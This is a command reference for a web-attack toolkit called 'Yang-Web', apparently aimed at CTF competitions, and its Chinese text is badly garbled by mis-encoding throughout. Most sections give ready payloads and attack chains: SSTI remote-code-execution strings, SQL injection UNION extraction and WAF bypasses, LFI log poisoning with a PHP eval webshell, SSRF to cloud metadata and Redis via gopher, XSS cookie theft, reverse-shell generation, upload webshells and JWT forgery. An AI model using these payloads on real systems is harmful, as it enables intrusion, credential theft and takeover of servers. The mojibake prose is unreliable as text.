# Yang-Web æä½æå ð

> æ¯ä¸ªåè½çè¯¦ç»æä½æ¹æ³ãä½¿ç¨åºæ¯ãç¤ºä¾åæå·§

---

## å¯å¨æ¹å¼

### GUI å¾å½¢çé¢ï¼æ¨èï¼
åå»æ¡é¢ **Yang-web** å¾æ ï¼æè²çªå£å¯å¨åé¡¶é¨æ Tab æ ç­¾é¡µåæ¢åè½æ¨¡åã

### CLI å½ä»¤è¡
```bash
cd C:\Users\é³\.qclaw\workspace\Yang-web
python -m yang_web sqli --db MySQL
```

---

## 1. ð è§£ç å¨

**åºæ¯**ï¼æ¿å°ä¸æ®µä¹±ç  / ç¼ç å­ç¬¦ä¸²ï¼ä¸ç¥éæ¯ä»ä¹æ ¼å¼ï¼è¦è¿åæææã

### CLI æä½
```bash
# èªå¨æ£æµ + é¾å¼è§£ç ï¼æ¨èï¼
python -m yang_web decode "NTI2ZjYyNmY3NDIwNjU2MTczNzk="

# æ´åå°è¯ææç¼ç å¨ï¼ç­éå¯è¯»ç»æ
python -m yang_web decode --brute "dGVzdA=="

# ç®¡éè¾å¥
echo "ZmxhZ3t0ZXN0fQ==" | python -m yang_web decode
```

### GUI æä½
1. ç¹å» **ð è§£ç ** æ ç­¾
2. å¨è¾å¥æ¡ç²è´´å¯æ
3. ç¹ **ð èªå¨è§£ç ** â æ¥çé¾å¼è§£ç è¿ç¨
4. å¦æèªå¨æ£æµä¸åï¼ç¹ **ð£ æ´åå°è¯** â ååºææå¯è½çç»æ

### æ¯æç¼ç 
base64 / base32 / base16 / base58 / base85 / URLç¼ç  / HTMLå®ä½ / ROT13 / äºè¿å¶ / å«è¿å¶ / åè¿å¶ASCII / Unicodeè½¬ä¹ / æ©æ¯çµç 

---

## 2. ð¢ ç¼ç 

**åºæ¯**ï¼æé  Payload æ¶éè¦æç¹æ®å­ç¬¦ç¼ç ã

```bash
python -m yang_web encode base64 "admin' OR 1=1 -- "
python -m yang_web encode url "id"
python -m yang_web encode rot13 "flag"
```

---

## 3. ð¨ SSTI æ¨¡æ¿æ³¨å¥

**åºæ¯**ï¼ç½é¡µè¾å¥ `{{7*7}}` è¿å `49`ï¼ç¡®è®¤ SSTI æ¼æ´åå©ç¨ã

### GUI æä½
1. ç¹å» **ð¨ SSTI** æ ç­¾
2. ä»ä¸ææ¡éæ©å¼æï¼é»è®¤å¨é¨ï¼
3. æ¥çæ£æµ Payload åå©ç¨ Payload
4. æç´¢æ¡æ `RCE` æ¾è¿ç¨æ§è¡ç¸å³ Payload

### CLI æä½
```bash
# ååºæ¯æçå¼æ
python -m yang_web ssti --list

# è·åæå®å¼æçæ£æµ Payload
python -m yang_web ssti --detect --engine "Jinja2"

# è·åå©ç¨ Payloadï¼RCE / æä»¶è¯»åï¼
python -m yang_web ssti --exploit --engine "Jinja2"

# æç´¢ç¹å® Payload
python -m yang_web ssti --search RCE
```

### æ¯æå¼æ
Jinja2 (Flask) Â· Twig (Symfony) Â· Smarty (PHP) Â· Mako (Python) Â· ERB (Ruby) Â· FreeMarker (Java) Â· Velocity (Java) Â· Django

### å¸å Payload
```
Jinja2 RCE:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[X]('cat /flag', shell=True) }}

Twig RCE:
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
```

---

## 4. ðï¸ SQL æ³¨å¥

**åºæ¯**ï¼åç°æ³¨å¥ç¹åï¼ä»æ¢æµå°è±åºä¸æ­¥å°ä½ã

### GUI æä½
1. ç¹å» **ðï¸ SQLi** æ ç­¾
2. ä¸ææ¡éæ°æ®åºç±»åï¼MySQL / PG / MSSQL / Oracle / SQLiteï¼
3. å·¦ä¾§æ¾ç¤ºè¯¥æ°æ®åºçææ Payload
4. æç´¢æ¡æ `æ¥é` / `æ¶é´` / `å å ` ç­å³é®è¯
5. ç¹å»é¡¶é¨å¶ä» Tab æ¥ç **WAF ç»è¿æå·§**

### CLI æä½
```bash
# ååºæ¯æçæ°æ®åº
python -m yang_web sqli --list

# æ¾ç¤ºæ¢æµ Payloadï¼é­å/åæ°/åæ¾ä½/æçº¹ï¼
python -m yang_web sqli --detect

# è·å MySQL å¨é Payload
python -m yang_web sqli --db MySQL

# è·åç²æ³¨æ¨¡æ¿
python -m yang_web sqli --blind

# æç´¢ Payload
python -m yang_web sqli --search æ¥é

# ð WAF ç»è¿
python -m yang_web sqli --waf              # å¨é¨
python -m yang_web sqli --waf ç©ºç½ç¬¦ç»è¿    # æåç±»
python -m yang_web sqli --waf å³é®å­åå½¢
```

### å¸åæ»å»é¾
```
1. é­åæ¢æµ: '  â æ¥é â ç¡®è®¤æ³¨å¥
2. åæ°æ¢æµ: ORDER BY 3 â æ­£å¸¸ / ORDER BY 4 â æ¥é â 3å
3. åæ¾ä½: UNION SELECT 1,2,3 â é¡µé¢æ¾ç¤º 2 â ç¬¬2ä½å¯åæ¾
4. æ°æ®åºå: UNION SELECT 1,database(),3
5. è¡¨å: UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()
6. åå: UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='flag_table'
7. è±æ°æ®: UNION SELECT 1,flag_column,3 FROM flag_table
```

### WAF ç»è¿éæ¥
| åºæ¯ | æ¹æ³ | ç¤ºä¾ |
|------|------|------|
| ç©ºæ ¼è¢«è¿æ»¤ | æ³¨é/æ¬å·/ç©ºç½ç¬¦ | `'/**/UNION/**/SELECT/**/1` |
| å³é®å­è¢«è¿æ»¤ | åå/å¤§å°å | `seselectlect` |
| select è¢«è¿æ»¤ | ç¼ç  | `char(115,101,108,101,99,116)` |
| ç­å·è¢«è¿æ»¤ | like/rlike | `' AND 1 LIKE 1` |
| éå·è¢«è¿æ»¤ | JOIN | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b` |
| å¼å·è¢«è¿æ»¤ | å®½å­è | `%df' OR 1=1#` |

---

## 5. ð LFI æä»¶åå«

**åºæ¯**ï¼URL ä¸­æ `?page=xxx` â è¯»æºç  / æ¥å¿æ±¡æ â RCEã

### GUI æä½
1. ç¹å» **ð LFI** æ ç­¾
2. ä¸ææ¡éç±»å«ï¼è·¯å¾éå / PHPä¼ªåè®® / æææä»¶ï¼

### CLI æä½
```bash
# è·¯å¾éå Payload
python -m yang_web lfi --traversal

# Linux æææä»¶åè¡¨
python -m yang_web lfi --linux

# Windows æææä»¶åè¡¨
python -m yang_web lfi --windows

# PHP ä¼ªåè®®
python -m yang_web lfi --php

# PHP filter chain çæå¨
python -m yang_web lfi --filter-chain
```

### å¸åæ»å»é¾
```
1. è¯» /etc/passwd: ../../../etc/passwd
2. è¯»æºç : php://filter/convert.base64-encode/resource=index.php
3. æ¥å¿æ±¡æ: å¨ User-Agent å <?php eval($_POST[1]);?> â åå« access.log
4. data:// RCE: data://text/plain,<?php system('id');?>
5. expect:// RCE: expect://id
```

---

## 6. ð SSRF

**åºæ¯**ï¼URL åæ°æ¥åä»»æå°å â è¯»äºåæ°æ® / æåç½ã

### CLI æä½
```bash
# äºå¹³å°åæ°æ®å°å
python -m yang_web ssrf --cloud aws      # AWS
python -m yang_web ssrf --cloud aliyun    # é¿éäº
python -m yang_web ssrf --cloud tencent   # è¾è®¯äº

# åç½å°åæ®µ
python -m yang_web ssrf --internal

# åè®®å©ç¨ï¼gopher æ Redis / dict æ«ç«¯å£ï¼
python -m yang_web ssrf --protocol

# ç»è¿æå·§
python -m yang_web ssrf --bypass
```

### å¸å Payload
```
AWS åæ°æ®: http://169.254.169.254/latest/meta-data/
é¿éäº:     http://100.100.100.200/latest/meta-data/
Gopher æ Redis: gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall...
```

---

## 7. ð XSS

**åºæ¯**ï¼è¾å¥æ¡æ²¡æè¿æ»¤ â XSS â çªå Cookie / éé±¼ã

### CLI æä½
```bash
# æ£æµ Payload
python -m yang_web xss --detect

# çªå Payload
python -m yang_web xss --steal cookie     # Cookie çªå
python -m yang_web xss --steal storage    # LocalStorage çªå

# ç»è¿æå·§
python -m yang_web xss --bypass

# Vue / Angular æ¨¡æ¿æ³¨å¥
python -m yang_web xss --template
```

---

## 8. ð» RCE å½ä»¤æ³¨å¥

**åºæ¯**ï¼`?cmd=ping 127.0.0.1` è½æ§è¡å½ä»¤ â åå¼¹ Shellã

### CLI æä½
```bash
# å½ä»¤æ³¨å¥ Payload
python -m yang_web rce --inject

# çæåå¼¹ Shell
python -m yang_web rce --shell bash --ip 10.0.0.1 --port 4444
python -m yang_web rce --shell python --ip 10.0.0.1 --port 4444
python -m yang_web rce --shell powershell --ip 10.0.0.1 --port 4444

# èªå®ä¹åå¼¹ Shell
python -m yang_web rce --custom
```

### é¾æ¥ç¬¦éæ¥
```
;  |  ||  &&  &  %0a  \n  `  $()
```

### ç©ºæ ¼ç»è¿
```
${IFS}  $IFS$9  <>  {cmd,arg}  %09  %0a
```

---

## 9. ð PHP æå·§

**åºæ¯**ï¼PHP ä»£ç å®¡è®¡ / å¼±ç±»åé»è¾ç»è¿ / WAF æ¦æªã

### GUI æä½
1. ç¹å» **ð PHP** æ ç­¾
2. æ¥ç Magic Hash / å¼±ç±»åæ¯è¾ / RCE Bypass / WAF ç»è¿

### CLI æä½
```bash
# Magic Hash
python -m yang_web php --magic

# å¼±ç±»åæ¯è¾
python -m yang_web php --type-juggle

# ååºåå
python -m yang_web php --deserialize

# RCE Bypass
python -m yang_web php --rce

# ð WAF ç»è¿
python -m yang_web php --waf-php
```

### Magic Hash æä¹ç¨
```
if ($_GET['password'] == '0e46209743...') â å¼±æ¯è¾ç»è¿å¯ç 
```
è¾å¥ `240610708` å³å¯ï¼å®ç MD5 ä»¥ `0e` å¼å¤´ â PHP å°å¶è§£éä¸ºç§å­¦è®¡æ°æ³ 0ï¼

### WAF ç»è¿æä¹é
```
eval è¢«è¿æ»¤ â evaleval (åå) æ 'ev'.'al' (æ¼æ¥) æ assert (æ¿æ¢)
system è¢«è¿æ»¤ â `id` (åå¼å·) æ call_user_func('system','id')
å³é®å­è¢«è¿æ»¤ â base64_decode('...') æ str_rot13('...')
```

---

## 10. ð¤ æä»¶ä¸ä¼ 

**åºæ¯**ï¼ä¸ä¼ å¤´åå¤ â "åªè½ä¸ä¼ å¾ç" â ç»è¿éå¶ä¸ä¼  Shellã

### GUI æä½
1. ç¹å» **ð¤ Upload** æ ç­¾
2. ä¾æ¬¡æ¥çï¼åç¼ç»è¿ â MIME ä¼ªé  â åå®¹ç»è¿ â è§£ææ¼æ´ â é«çº§æå·§

### CLI æä½
```bash
# åç¼åç»è¿
python -m yang_web upload --ext

# Content-Type ä¼ªé 
python -m yang_web upload --mime

# å¾çé©¬åå®¹
python -m yang_web upload --content

# è§£ææ¼æ´
python -m yang_web upload --parse nginx
python -m yang_web upload --parse apache
python -m yang_web upload --parse iis

# .htaccess / .user.ini
python -m yang_web upload --htaccess
python -m yang_web upload --userini

# é«çº§æå·§
python -m yang_web upload --advanced
```

### å¸åæ»å»é¾
```
1. åç¼ç»è¿: shell.php â è¢«æ¦æª
2. æ¢åç¼: shell.php3 / shell.phtml / shell.php. . (Win)
3. æ¹ MIME: Content-Type: image/jpeg + æä»¶å¤´ GIF89a
4. åå®¹ç»è¿: GIF89a<?=eval($_POST[1]);?>
5. ä¸ä¼ æå â è®¿é®
6. å¦æè¿ä¸è¡ â .htaccess / .user.ini / æ¡ä»¶ç«äº
```

### ä¸å¥è¯éæ¥
```
å¾çé©¬: GIF89a<?=eval($_POST[1]);?>
.htaccess: AddType application/x-httpd-php .jpg
.user.ini: auto_prepend_file=shell.jpg
Nginxè§£æ: ä¸ä¼  1.jpg â è®¿é® /uploads/1.jpg/1.php
```

---

## 11. ð Hash è¯å«

**åºæ¯**ï¼æ¿å°ä¸æ®µ Hashï¼ä¸ç¥éæ¯ä»ä¹ç®æ³ã

### GUI æä½
1. ç¹å» **ð Hash** æ ç­¾
2. ç²è´´ Hash â ç¹ **è¯å«**

### CLI æä½
```bash
python -m yang_web hashid "e10adc3949ba59abbe56e057f20f883e"
python -m yang_web hashid "$2y$10$..."
```

### è¾åºç¤ºä¾
```
ð è¾å¥: e10adc3949ba59abbe56e057f20f883e
ð é¿åº¦: 32 å­ç¬¦
ð å¯è½çç®æ³:
  â¢ MD5
  â¢ NTLM
  â¢ MD4
  â¢ Domain Cached Credentials
```

---

## 12. ð JWT æ»å»

**åºæ¯**ï¼ç»å½å Cookie éæ `eyJ...` â JWT Token â å°è¯æ»å»ã

### GUI æä½
1. ç¹å» **ð JWT** æ ç­¾
2. ç²è´´ Token
3. ä¾æ¬¡ç¹ï¼**ð è§£æ** â **ð åæ** â **â¡ Noneæ»å»** â **ð£ å¼±å¯é¥çç ´**

### CLI æä½
```bash
# è§£æï¼æ¥ç header + payloadï¼
python -m yang_web jwt "eyJhbGciOiJSUzI1NiIs..."

# å®å¨åæ
python -m yang_web jwt "eyJ..." --analyze

# None ç®æ³æ»å»ï¼alg æ¹ä¸º noneï¼
python -m yang_web jwt "eyJ..." --none

# å¼±å¯é¥çç ´
python -m yang_web jwt "eyJ..." --brute

# å·²ç¥å¯é¥ä¼ªé  Token
python -m yang_web jwt "eyJ..." --forge --secret "mysecret" --payload '{"admin":true}'
```

### å¸åæ»å»é¾
```
1. è§£æ JWT â æ¥ç alg (RS256/HS256)
2. å¦ææ jku/jwk â SSRF / å¯é¥æ³¨å¥
3. å°è¯ None æ»å» â alg: none â ç­¾åç½®ç©º
4. å¼±å¯é¥çç ´ â åç½® 100+ å¸¸è§å¯é¥
5. æ¿å°å¯é¥ â ä¼ªé  admin Token
```

---

## 13. ð¡ ç®å½æ«æ

**åºæ¯**ï¼æ¿å°äºç®æ ç½ç«ï¼æ³ç¥éæåªäºéèç®å½/æä»¶ã

### CLI æä½
```bash
# ç®å½æ«æ
python -m yang_web scan dir --search flag
python -m yang_web scan dir --search config
python -m yang_web scan dir --search admin

# æä»¶æ«æ
python -m yang_web scan file --search backup
python -m yang_web scan file --search sql

# ååºææè¯åº
python -m yang_web scan --list
```

### åç½®è¯åº
- ç®å½ï¼300+ æ¡ï¼admin/backup/config/flag/log/upload...ï¼
- æä»¶ï¼100+ æ¡ï¼index.php.bak/www.zip/.git/config...ï¼

---

## ð åè½éæ¥è¡¨

| éå°ä»ä¹ | ç¨ä»ä¹å½ä»¤ | ä¸é®å½ä»¤ |
|----------|-----------|---------|
| ä¸æ®µä¹±ç  | decode | `python -m yang_web decode "xxx"` |
| æ¨¡æ¿æ³¨å¥ | ssti | `python -m yang_web ssti --exploit --engine Jinja2` |
| SQL æ³¨å¥ | sqli | `python -m yang_web sqli --db MySQL` |
| æä»¶åå« | lfi | `python -m yang_web lfi --traversal` |
| SSRF | ssrf | `python -m yang_web ssrf --cloud aws` |
| XSS | xss | `python -m yang_web xss --detect` |
| å½ä»¤æ³¨å¥ | rce | `python -m yang_web rce --shell bash --ip IP --port PORT` |
| PHP ç»è¿ | php | `python -m yang_web php --waf-php` |
| æä»¶ä¸ä¼  | upload | `python -m yang_web upload --ext` |
| æªç¥ Hash | hashid | `python -m yang_web hashid "xxx"` |
| JWT Token | jwt | `python -m yang_web jwt "eyJ..."` |
| ç®å½æ«æ | scan | `python -m yang_web scan dir --search flag` |

---

## ð¡ GUI vs CLI éæ©

| | GUI | CLI |
|------|:---:|:---:|
| æµè§ Payload | â ç´è§ | â  éè®°åæ° |
| å¿«éå¤å¶ | â Ctrl+C | â pipe |
| æç´¢ç­é | â æ¡è¾å¥ | â --search |
| æ¹é/èæ¬ | â | â |
| æ¯èµç¯å¢ | â  éæ¾ç¤ºå¨ | â çº¯ç»ç«¯ |

å»ºè®®ï¼å¹³æ¶ç¨ GUI æµè§åå­¦ä¹ ï¼ææ¯èµæ¶ç¨ CLI å¿«éè°ç¨ã
